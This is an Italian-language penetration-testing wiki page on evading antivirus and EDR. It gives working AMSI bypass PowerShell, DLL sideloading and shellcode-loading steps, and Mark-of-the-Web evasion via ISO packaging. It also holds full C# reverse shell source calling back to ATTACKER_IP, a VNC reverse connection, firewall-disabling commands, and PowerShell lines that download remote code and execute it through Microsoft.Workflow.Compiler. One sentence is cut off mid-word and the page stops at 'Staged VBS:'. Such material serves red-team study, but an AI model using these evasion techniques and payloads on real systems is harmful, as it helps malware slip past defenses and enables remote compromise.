# Bypass Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato a una **carriera nel hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta di polacco fluente scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **Metodologia di Evasione AV**

Attualmente, gli AV utilizzano diversi metodi per controllare se un file è malevolo o meno, rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene contrassegnando stringhe o array di byte malevoli noti in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che utilizzare strumenti pubblici noti potrebbe farti catturare più facilmente, poiché probabilmente sono stati analizzati e contrassegnati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di un caricatore per decrittografare ed eseguire il programma in memoria.

- **Offuscamento**

A volte tutto ciò che devi fare è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può essere un compito che richiede tempo a seconda di ciò che stai cercando di offuscare.

- **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non ci saranno firme malevole note, ma questo richiede molto tempo e impegno.

> [!NOTE]
> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente, divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente, in questo modo, può dirti esattamente quali sono le stringhe o i byte contrassegnati nel tuo binario.

Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'evasione pratica degli AV.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in un sandbox e osserva attività malevole (ad es. cercare di decrittografare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sonno prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi utilizzare sonni lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sonno a seconda di come è implementato.
- **Controllo delle risorse della macchina** Di solito le sandbox hanno pochissime risorse con cui lavorare (ad es. < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole, non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi mirare a un utente la cui workstation è unita al dominio "contoso.local", puoi fare un controllo sul dominio del computer per vedere se corrisponde a quello che hai specificato, se non corrisponde, puoi far uscire il tuo programma.

Si scopre che il nome della macchina della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione, se il nome corrisponde a HAL9TH, significa che sei all'interno della sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>

Come abbiamo detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti chiederti qualcosa:

Ad esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso che è meno conosciuto e dumpa anche LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più contrassegnato malware dagli AV e dagli EDR, mentre il progetto stesso è super interessante, è anche un incubo lavorarci per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.

> [!NOTE]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è raggiungere l'evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Ogni volta che è possibile, **dai sempre priorità all'uso delle DLL per l'evasione**, nella mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un Payload DLL di Havoc ha un tasso di rilevamento di 4/26 in antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto antiscan.me di un normale payload EXE di Havoc vs un normale payload DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## Sideloading DLL & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal caricatore posizionando sia l'applicazione vittima che il/i payload malevolo/i uno accanto all'altro.

Puoi controllare i programmi suscettibili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script di powershell:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi suscettibili al DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare i programmi DLL Hijackable/Sideloadable da solo**, questa tecnica è piuttosto furtiva se eseguita correttamente, ma se utilizzi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente catturato.

Semplicemente posizionare una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma fa dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e potendo gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà 2 file: un modello di codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) che la DLL proxy hanno un tasso di rilevamento di 0/26 in [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ti **consiglio vivamente** di guardare il [VOD di S3cur3Th1sSh1t su twitch](https://www.twitch.tv/videos/1644171543) riguardo al DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su quanto abbiamo discusso in modo più approfondito.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload per bypassare gli EDR utilizzando processi sospesi, syscalls diretti e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> L'evasione è solo un gioco del gatto e del topo, ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo strumento, se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Interfaccia di Scansione Anti-Malware)

AMSI è stata creata per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per prevenirlo, poiché non aveva abbastanza visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- Controllo Account Utente, o UAC (elevazione di EXE, COM, MSI o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo i contenuti degli script in una forma sia non crittografata che non offuscata.

Eseguire `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso all'eseguibile da cui è stato eseguito lo script, in questo caso, powershell.exe

Non abbiamo scaricato alcun file su disco, ma siamo stati comunque catturati in memoria a causa di AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI funziona principalmente con rilevamenti statici, quindi, modificare gli script che cerchi di caricare può essere un buon modo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se ha più strati, quindi l'offuscamento potrebbe essere una cattiva opzione a seconda di come viene fatto. Questo rende non così semplice evadere. Anche se, a volte, tutto ciò che devi fare è cambiare un paio di nomi di variabili e andrà bene, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per evadere la scansione di AMSI.

**Forzare un Errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) comporterà che non verrà avviata alcuna scansione per il processo corrente. Originariamente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una firma per prevenire un uso più ampio.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastava una riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell attuale. Questa riga è stata ovviamente segnalata da AMSI stesso, quindi è necessaria qualche modifica per utilizzare questa tecnica.

Ecco un bypass AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che questo verrà probabilmente segnalato una volta pubblicato, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e comporta la ricerca dell'indirizzo per la funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e la sovrascrittura con istruzioni per restituire il codice per E_INVALIDARG, in questo modo, il risultato della scansione effettiva restituirà 0, che viene interpretato come un risultato pulito.

> [!NOTE]
> Si prega di leggere [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Ci sono anche molte altre tecniche utilizzate per bypassare AMSI con PowerShell, dai un'occhiata a [**questa pagina**](basic-powershell-for-pentesters/#amsi-bypass) e [questo repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più su di esse.

O questo script che tramite memory patching patcherà ogni nuovo Powersh

## Obfuscation

Ci sono diversi strumenti che possono essere utilizzati per **offuscare il codice C# in chiaro**, generare **modelli di metaprogrammazione** per compilare binari o **offuscare binari compilati** come:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di fornire maggiore sicurezza software attraverso [l'offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione contro manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, al momento della compilazione, codice offuscato senza utilizzare alcuno strumento esterno e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiungi uno strato di operazioni offuscate generate dal framework di metaprogrammazione C++ che renderà un po' più difficile la vita a chi vuole craccare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore binario x64 in grado di offuscare vari file pe diversi tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice a grana fine per linguaggi supportati da LLVM che utilizza ROP (programmazione orientata al ritorno). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un Crypter PE .NET scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questo schermo quando scarichi alcuni eseguibili da internet ed eseguirli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza destinato a proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando su Maggiori informazioni -> Esegui comunque).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome di Zone.Identifier che viene creato automaticamente al momento del download di file da internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dello Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!NOTE]
> È importante notare che gli eseguibili firmati con un certificato di firma **fidato** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire che i tuoi payload ricevano il Mark of The Web è imballarli all'interno di qualche tipo di contenitore come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che imballa i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO utilizzando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Riflessione sull'Assembly C#

Caricare binari C# in memoria è noto da un po' di tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere catturati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo solo preoccuparci di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) forniscono già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Comporta **la creazione di un nuovo processo sacrificabile**, iniettando il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguendo il tuo codice malevolo e, una volta terminato, uccidendo il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo di impianto Beacon. Ciò significa che se qualcosa nella nostra azione di post-exploitation va storto o viene catturato, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere catturato da **Rilevamenti Comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo, puoi evitare di dover creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto con l'esecuzione del tuo payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** poiché potrebbe bloccarsi.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Se vuoi leggere di più sul caricamento degli Assembly C#, ti consiglio di controllare questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare Assembly C# **da PowerShell**, dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al video di [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilizzo di Altri Linguaggi di Programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo utilizzando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attaccante**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repo indica: Defender scansiona ancora gli script, ma utilizzando Go, Java, PHP, ecc. abbiamo **maggiore flessibilità per bypassare le firme statiche**. Testare con script di reverse shell casuali non offuscati in questi linguaggi si è rivelato un successo.

## Evasione Avanzata

L'evasione è un argomento molto complicato, a volte devi tenere conto di molte diverse fonti di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti scontri avrà i propri punti di forza e di debolezza.

Ti incoraggio vivamente a guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'idea delle tecniche di evasione più avanzate.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Questo è anche un altro grande intervento di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasione in Profondità.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Tecniche Vecchie**

### **Controlla quali parti Defender trova come malevole**

Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a **scoprire quale parte Defender** trova come malevole e te lo dividerà.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un'offerta web aperta che fornisce il servizio in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows venivano fornite con un **server Telnet** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **partire** quando il sistema viene avviato e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disabilita TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **nuovamente** creato _**UltraVNC.ini**_ all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** dovrebbe **eseguire all'interno** del suo **host** il binario `vncviewer.exe -listen 5900` in modo che sia **pronto** a catturare una **connessione VNC** inversa. Poi, all'interno della **vittima**: Avvia il demone winvnc `winvnc.exe -run` e esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la furtività non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale difensore terminerà il processo molto rapidamente.**

### Compilare il nostro reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilarlo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# utilizzando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Download ed esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utilizzare python per costruire esempi di iniettori:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
